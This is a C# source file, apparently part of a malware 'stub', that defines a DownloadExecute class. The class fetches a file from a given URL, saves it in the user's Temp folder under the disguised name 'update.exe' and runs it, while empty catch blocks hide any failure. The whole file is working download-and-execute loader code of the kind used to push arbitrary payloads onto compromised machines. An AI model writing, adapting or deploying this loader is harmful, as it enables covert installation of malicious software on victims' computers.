using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Net;

namespace stub
{
    internal class DownloadExecute
    {

        static string letter = DriveGet.getdrives();
        static string user = Environment.UserName;
        static string exe_path = letter + @"Users\" + user + @"\AppData\Local\Temp\update.exe";

        public static void dlHandler(string url)
        {
            Uri uri = new Uri(url);

            try
            {
                if (File.Exists(exe_path))
                {
                    File.Delete(exe_path);
                    WebClient wc = WebClientHandler.wcReturn();
                    wc.DownloadFileAsync(uri, exe_path);
                    wc.DownloadFileCompleted += new AsyncCompletedEventHandler(wc_DownloadFileCompleted);
                }
                else if (!File.Exists(exe_path))
                {
                    WebClient wc = WebClientHandler.wcReturn();
                    wc.DownloadFileAsync(uri, exe_path);
                    wc.DownloadFileCompleted += new AsyncCompletedEventHandler(wc_DownloadFileCompleted);

                }
            }
            catch { }
        }

        private static void wc_DownloadFileCompleted(object sender, AsyncCompletedEventArgs e)
        {
            try
            {
                if (e.Error == null)
                {
                    Process.Start(exe_path);
                }
            }
            catch { }
        }
    }
}
